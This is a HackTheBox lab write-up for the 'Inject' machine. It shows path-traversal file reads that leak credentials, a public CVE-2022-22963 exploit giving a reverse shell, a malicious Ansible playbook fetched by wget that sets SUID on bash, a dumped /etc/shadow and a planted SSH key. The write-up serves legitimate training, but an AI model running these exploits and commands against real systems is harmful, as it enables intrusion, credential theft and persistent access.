---
title: "HTB - Inject"
date: 2023-06-23T08:36:09+09:30
draft: false
---

[//]: # (Project: HTB Machine Writeups - Generated with Python3)  
[//]: # (Title: HTB Inject Writeup)  
[//]: # (Author: M4773L)  
[//]: # (Date: 21/06/2023 - 05:04 PM)  
[//]: # (Date_Modified: ) 
[//]: # (WEBSITE_URL: http://m4773l.github.io)
[//]: # (GITHUB_REPO_URL: https://github.com/M4773L)

# Inject
 
Inject is an easy rated machine on the HackTheBox platform that hosts a simple web application built on the Spring framework. Enumerating the site we will identify a local file inclusion (LFI) vulnerability which allows us to retrieve various configuration files. With some quick Google searches we will identify a widely disclosed remote-code execution vulnerability which we can exploit to get a reverse shell. Privilege escalation is relatively straightforward by making use of Ansible Automation Tasks.  
<!--more-->  

![Machine Info Card](/blog/htb/machines/inject/img/inject.png)  
&nbsp;  

## Enumeration
**Target IP: 10.10.11.204**

#### Nmap

**TCP - Aggressive**  
```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ nmap -A 10.10.11.204                                                                                                                                                                                                               255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-21 17:08 ACST
Nmap scan report for 10.10.11.204
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds

```  
An aggressive Nmap scan performed on the target IP returns 2 open ports; SSH on port 22 and a HTTP server at port 8080.  
&nbsp;  

**TCP-Connect**  
```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ nmap -sTV -p- 10.10.11.204                           
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-21 17:09 ACST
Nmap scan report for 10.10.11.204
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.25 seconds

```
A TCP connect scan across the whole port range returns the same ports as we identified in the aggressive scan above.  
&nbsp;  

**UDP**  
```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ sudo nmap -sUV --top-ports 1000 10.10.11.204                                                                                                                     
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-21 17:07 ACST
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.62% done; ETC: 17:12 (0:05:04 remaining)
Nmap scan report for 10.10.11.204
Host is up (0.081s latency).
Not shown: 999 closed ports
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1189.44 seconds

```  
A UDP scan of the top 1000 UDP ports returns only the DHCP service on port 68 which is a relatively standard port to see on HTB Machines.  
&nbsp;  

#### Directory Fuzzing

```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.204:8080/FUZZ                   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.204:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

register                [Status: 200, Size: 5654, Words: 1053, Lines: 104]
blogs                   [Status: 200, Size: 5371, Words: 1861, Lines: 113]
upload                  [Status: 200, Size: 1857, Words: 513, Lines: 54]
release_notes           [Status: 200, Size: 1086, Words: 137, Lines: 34]
                        [Status: 200, Size: 6657, Words: 1785, Lines: 166]
:: Progress: [220546/220546] :: Job [1/1] :: 50 req/sec :: Duration: [0:34:19] :: Errors: 0 ::
```
Fuzzing for directories using FFUF, we identify some endpoints which are linked from the homepage as well as a 'release_notes' endpoint.  
&nbsp;  

#### The App
Lets take a look at the site, firing up BurpSuite to act as our proxy before navigating to the page in Firefox browser.  
&nbsp;  

**BurpSuite**  

![Burp Scope](/blog/htb/machines/inject/img/burp_scope.jpg)  
Launch BurpSuite and add the target machines IP / Port to the target scope.  
&nbsp;  

**Firefox Browser**  

![Home](/blog/htb/machines/inject/img/homepage.jpg)  
The homepage has a title of Zodd cloud which states we can "Store, share and collaborate on files and folders from your mobile device, tablet, or computer." The site is largely static with several links simply non-existent or link to a section on the homepage.  

![Register](/blog/htb/machines/inject/img/register.jpg)  
The register endpoint shows a message statint that the app is under construction.  

![Blog](/blog/htb/machines/inject/img/blog.jpg)  
The blog endpoint returns 3 articles however we cannot view the articles or read the comments.  

![Upload](/blog/htb/machines/inject/img/upload_1.jpg)  
The upload endpoint looks like it provides the functionality to upload files.  

![Release Notes](/blog/htb/machines/inject/img/release_notes.jpg)  
Taking a look at the 'release_notes' endpoint we identified whilst fuzzing for directories provides some vague messages regarding bug fixes and some added checks on the upload feature.  
&nbsp;  

**Testing Upload Functionality**  

![Upload](/blog/htb/machines/inject/img/upload_2.jpg)  
To test the functionality of the upload endpoint I will browse for and upload an image file named 'blank.png'.  

![Upload](/blog/htb/machines/inject/img/upload_3.jpg)  
After the file uploads successfully a message stating the file is uploaded is displayed as well as a link to view your image.  

![Upload](/blog/htb/machines/inject/img/show_image.jpg)  
Clicking on the link to view the uploaded image takes us to an endpoint named 'show_image' which accepts a filename as an 'img' parameter. This functionality looks interesting, what other files can we read with this endpoint.  
&nbsp;  

## Foothold
**Burp Repeater**  

![Burp Repeater](/blog/htb/machines/inject/img/burp_repeater_1.jpg)  
Back over in BurpSuite I am going to send the get request to the 'show_image' endpoint to the repeater function.  
&nbsp;  

**/etc/passwd**  

![Burp Repeater](/blog/htb/machines/inject/img/burp_repeater_2.jpg)  
Testing to see if we can traverse paths to the '/etc' directory and read the 'passwd' file is successful, reading the file and supplying the contents in the response.  
&nbsp;  

**App Config**  

![Burp Repeater](/blog/htb/machines/inject/img/burp_repeater_3.jpg)  
After several attempts to read a variety of configuration files, I have success reading the Project Object Model file 'pom.xml'. 
&nbsp;  

```                                                                                                                    
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ wget http://10.10.11.204:8080/show_image?img=../../../pom.xml -O pom.xml                                                                                                                                                             4 ⨯
--2023-06-21 19:47:35--  http://10.10.11.204:8080/show_image?img=../../../pom.xml
Connecting to 10.10.11.204:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 2187 (2.1K) [image/jpeg]
Saving to: ‘pom.xml’

pom.xml                                                     100%[========================================================================================================================================>]   2.14K  --.-KB/s    in 0s      

2023-06-21 19:47:35 (217 MB/s) - ‘pom.xml’ saved [2187/2187]
```
I am going to download a copy of the file using Wget.  
&nbsp;  

```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ cat pom.xml                         
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.6.5</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
        <groupId>com.example</groupId>
        <artifactId>WebApp</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>WebApp</name>
        <description>Demo project for Spring Boot</description>
        <properties>
                <java.version>11</java.version>
        </properties>
        <dependencies>
                <dependency>
                        <groupId>com.sun.activation</groupId>
                        <artifactId>javax.activation</artifactId>
                        <version>1.2.0</version>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <scope>runtime</scope>
                        <optional>true</optional>
                </dependency>

                <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                        <scope>test</scope>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>bootstrap</artifactId>
                        <version>5.1.3</version>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>webjars-locator-core</artifactId>
                </dependency>

        </dependencies>
        <build>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                                <version>${parent.version}</version>
                        </plugin>
                </plugins>
                <finalName>spring-webapp</finalName>
        </build>

</project>

```
Printing the contents to the terminal window using cat, we can see several references to Apache Maven. We can also see the dependencies from the Spring framework.  
&nbsp;  

**Settings.xml**  

![Maven Settings](/blog/htb/machines/inject/img/maven_settings.jpg)  
A quick Google search returns the documentation for the 'settings.xml' file from Apache Maven.  

![Burp Repeater](/blog/htb/machines/inject/img/burp_repeater_4.jpg)  
Over in Burp Repeater lets try and read the settings file in the users home directory.  
&nbsp;  

```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ wget http://10.10.11.204:8080/show_image?img=../../../../../../../../../home/frank/.m2/settings.xml -O settings.xml
--2023-06-21 20:04:30--  http://10.10.11.204:8080/show_image?img=../../../../../../../../../home/frank/.m2/settings.xml
Connecting to 10.10.11.204:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 617 [image/jpeg]
Saving to: ‘settings.xml’

settings.xml                                                100%[========================================================================================================================================>]     617  --.-KB/s    in 0s      

2023-06-21 20:04:30 (25.9 MB/s) - ‘settings.xml’ saved [617/617]
```
Retreive a copy of the 'settings.xml' file to your local machine for later reference.  

```                                                                                                                                                                                                                                             
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```
Reading the file with the 'cat' command we have a username, password and the location of a private key.  

**id_dsa**  

![Burp Repeater](/blog/htb/machines/inject/img/burp_repeater_5.jpg)  
Attempting to retrieve the private key proves to be unfruitful with the file not existing.  
&nbsp;  

#### Vulnerable Package
Whilst searching for vulnerabilities in Springboot, the Spring Cloud dependency was mentioned in numerous results.    

```
                <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
                </dependency>
```
From the 'pom.xml' file we retrieved earlier.   
&nbsp;  

**Spring Framework**  
Spring is a framework developed to provide a comprehensive configuration and programming model for deployment of modern Java applications across any deployment platform.   
[Spring Framework](https://spring.io/projects/spring-framework)  
&nbsp;  

**Springboot**  
Springboot leverages the Spring-Framework to create production grade, stand-alone applications that "just run". With plenty of modules and submodules available it streamlines the development process making it relatively simple to get an application up and running.  
[Spring Boot](https://spring.io/projects/spring-boot)  
&nbsp;  

**CVE-2022-22963 - Remote Code Execution in Spring Cloud Function**  
This vulnerability exists within the routing functionality in Spring Cloud function (spring-cloud-function-web) upto and including version 3.2.2. If a user supplies a malicious Spring Expression Language (SpEL) as a routing expression this could lead to remote code execution.  
[CVE-2022-22963 - Spring](https://spring.io/security/cve-2022-22963)  
&nbsp;  

#### Plan
While looking through the search results from Google I came across a Proof of Concept for CVE-2022-22963 that will test if the application is vulnerable before proceeding to spawn a reverse shell.  

![GitHub POC](/blog/htb/machines/inject/img/github_poc.jpg)  
[Proof of Concept - GitHub](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit)  

```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ git clone https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit.git
Cloning into 'CVE-2022-22963_Reverse-Shell-Exploit'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), 4.06 KiB | 4.06 MiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                                                                             
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ cd CVE-2022-22963_Reverse-Shell-Exploit 
```
Clone the repository from GitHub and change into the POC's directory.  

```
┌──(matt㉿HackTheBoxKali)-[~/Inject/CVE-2022-22963_Reverse-Shell-Exploit]
└─$ python3 exploit.py -u http://10.10.11.204:8080/
[+] Target http://10.10.11.204:8080/

[+] Checking if http://10.10.11.204:8080/ is vulnerable to CVE-2022-22963...

[+] http://10.10.11.204:8080/ is vulnerable

[/] Attempt to take a reverse shell? [y/n]y
listening on [any] 4444 ...
[$$] Attacker IP:  10.10.14.8
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.204] 35682
bash: cannot set terminal process group (824): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ id
id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
frank@inject:/$ pwd
pwd
/
frank@inject:/$
```
The exploit uses only packages that are included in the standard Python library. We can simply launch the exploit.py file with a single argument of the target URL. The exploit checks if the application is vulnerable before offering to create a reverse shell, answering yes the app asks for our IP address where we will receive the reverse shell connection. And as simple as that we have a shell as user Frank on the target machine.  
&nbsp;   

## Privilege Escalation - User

```
frank@inject:/$ su phil
su phil
Password: DocPhillovestoInject123
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
python3 -c 'import pty;pty.spawn("/bin/bash")'
phil@inject:/$
phil@inject:~$ cd ~/ 
cd ~/
phil@inject:~$ cat user.txt
cat user.txt
bebb2d54*************
```
Using the credentials we previously identified in the Apache Maven settings.xml file lets try to switch user to 'Phil', this is successful and I will use a Python one-liner to provide us with a better command prompt.
&nbsp;  

## Privilege Escalation - Root

```
phil@inject:~$ ls -laR /opt
ls -laR /opt
/opt:
total 12
drwxr-xr-x  3 root root 4096 Oct 20  2022 .
drwxr-xr-x 18 root root 4096 Feb  1 18:38 ..
drwxr-xr-x  3 root root 4096 Oct 20  2022 automation

/opt/automation:
total 12
drwxr-xr-x 3 root root  4096 Oct 20  2022 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
drwxrwxr-x 2 root staff 4096 Jun 21 11:00 tasks

/opt/automation/tasks:
total 12
drwxrwxr-x 2 root staff 4096 Jun 21 11:00 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Jun 21 11:00 playbook_1.yml
```  
Recursively listing out the contents of the '/opt' directory reveals some sub-directories and an Ansible playbook file. It also appears that members of the 'staff' user group can write to the directory.  
&nbsp;  

```
phil@inject:~$ cat /opt/automation/tasks/playbook_1.yml
cat /opt/automation/tasks/playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```
Lets take a look at the 'playbook_1.yml' file and it is realtively simple, it checks via systemd that the webapp has been started.
&nbsp; 

#### Ansible

![Ansible Automation Tasks](/blog/htb/machines/inject/img/ansible_automation.jpg)  
Searching Google for privilege escalation with Ansible Automation Task leads me to the above post, it appears trivial to exploit.  

1. Create a Malicous Playbook file.  
2. Transfer to host.  
3. Wait and check for changes to permissions.  
4. Execute bash in privileged mode.  

[Priv-esc Ansible Automation Tasks](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/#privesc-with-automation-task)
&nbsp;  

```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ vim not_evil.yaml
```
Open an empty YAML file with your text editor of choice.  
&nbsp;  

```
---
- hosts: localhost
  tasks:
    - name: Evil
      ansible.builtin.shell: |
       chmod +s /bin/bash
      become: true
```
Create an Ansible playbok using a valid YAML data structure. As you can see we will be using the Ansible built-in shell to execute the 'chmod +s /bin/bash' command, the become key signifies that Ansible should become root prior to executing the playbook contents.  
&nbsp;  

```                                                                                                                                            
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ python3 -m http.server 8010
Serving HTTP on 0.0.0.0 port 8010 (http://0.0.0.0:8010/) ...
10.10.11.204 - - [21/Jun/2023 20:42:26] "GET /not_evil.yaml HTTP/1.1" 200 -
```
Host your malicious Ansible playbook with a Python HTTP server or similar.  
&nbsp;  

```
phil@inject:/opt/automation/tasks$ wget http://10.10.14.8:8010/not_evil.yaml -O playbook_2.yml
<p://10.10.14.8:8010/not_evil.yaml -O playbook_2.yml
--2023-06-21 12:10:51--  http://10.10.14.8:8010/not_evil.yaml
Connecting to 10.10.14.8:8010... connected.
HTTP request sent, awaiting response... 200 OK
Length: 126 [application/octet-stream]
Saving to: ‘playbook_2.yml’

playbook_2.yml      100%[===================>]     126  --.-KB/s    in 0s      

2023-06-21 12:10:51 (859 KB/s) - ‘playbook_2.yml’ saved [126/126]

phil@inject:/opt/automation/tasks$ ansible-playbook playbook_2.yml --syntax-check
<sks$ ansible-playbook playbook_2.yml --syntax-check
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'

playbook: playbook_2.yml

```
Retrieve the playbook file from your Python3 HTTP server and write it to '/opt/automation/tasks' directory, run the ansible-playbook command with the ```--check-syntax``` flag to ensure your playbook file is valiud YAML.  
&nbsp;  

```
phil@inject:/opt/automation/tasks$ ls -la
ls -la
total 16
drwxrwxr-x 2 root staff 4096 Jun 21 12:10 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Jun 21 12:10 playbook_1.yml
-rw-rw-r-- 1 phil phil   126 Jun 21 12:11 playbook_2.yml
phil@inject:/opt/automation/tasks$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash

```
Listing out the contents of the tasks directory you can see the 2 playbook files, checking the permissions on '/bin/bash' you can see the file permissions show that the UID and GUID will be set at execution.  
&nbsp;  

## Root

```
bash -p
bash-5.0# id
id
uid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)

bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
playbook_1.yml  root.txt

bash-5.0# cat root.txt
cat root.txt
d485d6606f************

```  
Executing the command ```bash -p``` launches bash as root, I am now able to navigate to the root directory and read the root flag.  
&nbsp;  

**/etc/shadow**  

```
bash-5.0# cat /etc/shadow
cat /etc/shadow
root:$6$KeHoGfvAPeHOqplu$tC/4gh419crGM6.btFzCazMPFH0gaX.x/Qp.PJZCoizg4wYcl48wtOGA3lwxNjooq9MDzJZJvzav7V37p9aMT1:19381:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
landscape:*:19046:0:99999:7:::
pollinate:*:19046:0:99999:7:::
usbmux:*:19090:0:99999:7:::
systemd-coredump:!!:19090::::::
frank:$6$fBwyjkLHtSuUCpHx$6G9LujV0iop.QxbfQpwDcSaRWDDobBlVMo5.6gVJVnQabcbmFwdkwFfmJNAX27u3Cdg9ZO5977pCst7hF98kc/:19381:0:99999:7:::
lxd:!:19090::::::
sshd:*:19260:0:99999:7:::
phil:$6$Z.KhzrHH6PXCuNbO$dL9xyMTydwjYPcrunZb7OO9a0hCwrUPOeQfdum818rW4NPtsiXEji15NMmikgYBGLDbWPUfLIpCpOuCRxYedM.:19388:0:99999:7:::
fwupd-refresh:*:19389:0:99999:7:::
_laurel:!:19389::::::

```
We can then retrieve the shadow file from /etc.  
&nbsp;  

**SSH as Root**  

```
bash-5.0# wget http://10.10.14.8:8010/id_rsa.pub -O .ssh/authorized_keys
wget http://10.10.14.8:8010/id_rsa.pub -O .ssh/authorized_keys
--2023-06-21 12:31:06--  http://10.10.14.8:8010/id_rsa.pub
Connecting to 10.10.14.8:8010... connected.
HTTP request sent, awaiting response... 200 OK
Length: 101 [application/vnd.exstream-package]
Saving to: ‘.ssh/authorized_keys’

.ssh/authorized_key 100%[===================>]     101  --.-KB/s    in 0s      

2023-06-21 12:31:06 (2.26 MB/s) - ‘.ssh/authorized_keys’ saved [101/101]

```
Generate a keypair and transfer the public key to the target.  

```
┌──(matt㉿HackTheBoxKali)-[~/Inject]
└─$ ssh -i id_rsa root@10.10.11.204
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 21 Jun 2023 12:31:54 PM UTC

  System load:           0.21
  Usage of /:            85.8% of 5.56GB
  Memory usage:          49%
  Swap usage:            0%
  Processes:             249
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.204
  IPv6 address for eth0: dead:beef::250:56ff:feb9:42d2

  => / is using 85.8% of 5.56GB


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 21 12:29:58 2023 from 10.10.14.8
root@inject:~# id
uid=0(root) gid=0(root) groups=0(root)
root@inject:~# 
```
SSH into the target using your private key.  
&nbsp;
